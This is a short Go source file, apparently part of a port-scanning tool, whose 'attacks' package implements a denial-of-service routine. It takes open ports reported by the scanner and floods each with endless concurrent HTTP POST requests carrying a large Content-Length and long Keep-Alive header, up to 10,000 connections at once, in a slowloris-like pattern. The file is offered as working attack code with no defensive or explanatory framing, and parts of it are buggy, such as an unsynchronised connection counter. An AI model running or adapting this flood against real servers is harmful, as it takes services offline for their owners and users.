package attacks

import (
	"fmt"
	"log"
	"net/http"

	"github.com/EwanValentine/deepscan/pkg/scanner"
)

const (
	// MaxCon Set max connections to 10000
	// @todo - make this customisable
	MaxCon = 10000
)

type scans interface {
	Listen() <-chan *scanner.Result
}

// DenialOfService listens for open ports from
// a scanner and begins to send high amounts of
// traffic containing large headers.
func DenialOfService(s scans) {
	for {
		select {
		case res, more := <-s.Listen():
			if more {
				// color.Green("Attack complete")
				go attack(res)
			}
			return
		}
	}
}

func attack(res *scanner.Result) {
	req, err := http.NewRequest("POST", fmt.Sprintf("%s:%d", res.Addr, res.PortScan.Port), nil)
	if err != nil {
		panic(err)
	}
	req.Header.Add("Content-Length", "10000")
	req.Header.Add("Keep-Alive", "900")

	client := &http.Client{}

	openConnections := 0
	for {
		// If number of open connections is less than the max
		// create a new one.
		if openConnections <= MaxCon {
			go func() {
				openConnections++
				defer func() { openConnections-- }()
				resp, err := client.Do(req)
				if err != nil {
					log.Println(err.Error())
				}
				defer resp.Body.Close()
				fmt.Println("POST returned: ", resp.Status)
			}()
		}
	}
}
